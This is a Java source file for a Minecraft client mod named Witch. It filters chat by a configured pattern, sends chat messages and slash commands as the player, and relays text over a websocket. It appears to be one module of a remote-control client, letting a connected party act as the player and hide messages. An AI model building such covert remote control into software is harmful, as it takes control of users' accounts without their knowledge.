package me.soda.witch.features;

import me.soda.witch.config.Config;
import me.soda.witch.websocket.MessageUtils;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.regex.Pattern;

import static me.soda.witch.Witch.mc;

public class ChatControl {

    private static final Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + "Witch" + Formatting.GRAY + "] " + Formatting.RESET);

    private static boolean firstTime = true;

    public static boolean filter(Text message) {
        if (!Config.isBeingFiltered) return false;
        Pattern pattern = Pattern.compile(Config.filterPattern);
        return pattern.matcher(message.getString()).find();
    }

    public static void sendChat(String message) {
        try {
            if (mc.world == null || mc.player == null) return;
            mc.inGameHud.getChatHud().addToMessageHistory(message);
            if (message.startsWith("/")) mc.player.sendCommand(message.substring(1), null);
            else mc.player.sendChatMessage(message, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void chat(Text msg) {
        if (firstTime) {
            firstTime = false;
            chat(Text.of("Alert: Input @w <text> to chat with the Witch."));
        }
        if (mc.world == null) return;

        MutableText message = Text.literal("");
        message.append(prefix);
        message.append(msg);

        mc.inGameHud.getChatHud().addMessage(message);
    }

    public static boolean tryChatBack(String string) {
        String[] msgArr = string.split(" ");
        if (msgArr.length < 2) return false;
        String[] strArr = new String[msgArr.length - 1];
        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
        MessageUtils.sendMessage("chat", String.join(" ", strArr));
        return true;
    }
}
